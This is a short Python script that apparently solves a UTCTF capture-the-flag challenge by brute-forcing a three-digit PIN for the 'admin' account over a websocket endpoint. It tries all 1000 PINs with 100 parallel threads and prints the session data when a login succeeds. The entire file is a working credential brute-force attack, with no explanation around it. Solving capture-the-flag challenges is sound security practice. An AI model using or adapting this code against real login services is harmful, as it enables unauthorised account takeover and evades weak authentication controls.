#!/usr/bin/env python3

import asyncio
import websockets
from concurrent.futures import ThreadPoolExecutor

URL = 'ws://web1.utctf.live:8651/internal/ws'
PINLENGTH = 3
USERNAME = 'admin'

async def tryLoginWith(pin):
    async with websockets.connect(URL) as websocket:
        begin = await websocket.recv()
        if begin == 'begin':
            await websocket.send(f'begin')
            await websocket.send(f'user {USERNAME}')
            await websocket.send(f'pass {pin}')

            data = await websocket.recv()
#            print(f'<<< {data}')
            if 'session' in data:
                print(f'[<<<] Data: {data} | Pincode: {pin}')
            else:
                print(f'[-] Wrong Pincode: {pin}')

def send(args):
    asyncio.run(tryLoginWith(str(args).zfill(PINLENGTH)))

args = [ x for x in range(1000) ]
with ThreadPoolExecutor(max_workers=100) as pool:
    pool.map(send,args)
